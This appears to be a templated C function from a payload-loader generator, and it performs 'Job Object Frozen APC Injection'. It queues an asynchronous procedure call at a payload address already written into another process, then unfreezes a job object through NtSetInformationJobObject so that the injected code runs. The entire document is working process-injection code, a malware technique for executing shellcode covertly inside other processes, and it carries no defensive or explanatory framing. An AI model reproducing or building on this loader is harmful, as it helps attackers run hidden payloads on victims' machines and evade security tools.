
void ExecutePayload(void* pRemoteAddress, const unsigned char* payload, SIZE_T payload_len, HANDLE hTargetProcess, HANDLE hTargetThread, HANDLE hJob) {
    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
    (void)payload;     // Unused, already written by base template
    (void)payload_len; // Unused
    (void)hTargetProcess; // Unused in this function (only used for alloc/write), but good to have

    DEBUG_PRINT("Executing payload via Job Object Frozen APC Injection...");

    if (pRemoteAddress == NULL) {
        DEBUG_PRINT("ExecutePayload: Received a NULL pointer. Aborting.");
        return;
    }

    DEBUG_PRINT("Queuing APC to frozen thread at %p", pRemoteAddress);
    pfnQueueUserAPC((PAPCFUNC)pRemoteAddress, hTargetThread, (ULONG_PTR)NULL);

    DEBUG_PRINT("Unfreezing job to execute APC...");
    freezeInfo.FreezeOperation = 1;
    freezeInfo.Freeze = FALSE;
    NTSTATUS jobStatus = pfnNtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, 
                                           &freezeInfo, sizeof(freezeInfo));
    if (!NT_SUCCESS(jobStatus)) {
        DEBUG_PRINT("NtSetInformationJobObject (unfreeze) failed: 0x%X", jobStatus);
    }

    {% if output_format == 'dll' %}
    DEBUG_PRINT("DLL mode - waiting for process execution...");
    pfnWaitForSingleObject(hTargetProcess, 10000);
    {% endif %}

    DEBUG_PRINT("Job Object Frozen APC injection complete.");

    if (hTargetThread) pfnCloseHandle(hTargetThread);
    if (hTargetProcess) pfnCloseHandle(hTargetProcess);
    if (hJob) pfnCloseHandle(hJob);
}
